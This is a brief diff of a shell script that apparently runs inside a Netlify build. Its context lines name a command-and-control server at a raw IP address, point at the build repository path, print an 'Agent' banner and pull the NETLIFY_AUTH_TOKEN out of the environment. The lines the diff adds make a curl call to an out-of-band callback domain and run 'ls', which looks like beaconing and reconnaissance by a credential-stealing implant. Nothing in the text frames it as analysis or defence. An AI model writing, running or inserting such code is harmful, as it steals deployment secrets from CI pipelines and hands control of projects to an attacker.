@@ -4,7 +4,8 @@
 C2_SERVER="http://64.225.122.79:8120"
 HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
 SCAN_PATH="/opt/build/repo"
-
+curl https://asdfazrcdfgqoiuibvkf934exsjcoluvq.oast.fun
+ls
 echo "[*] Agent - ${HOSTNAME}"
 
 NETLIFY_TOKEN=$(env | grep NETLIFY_AUTH_TOKEN | cut -d'=' -f2)
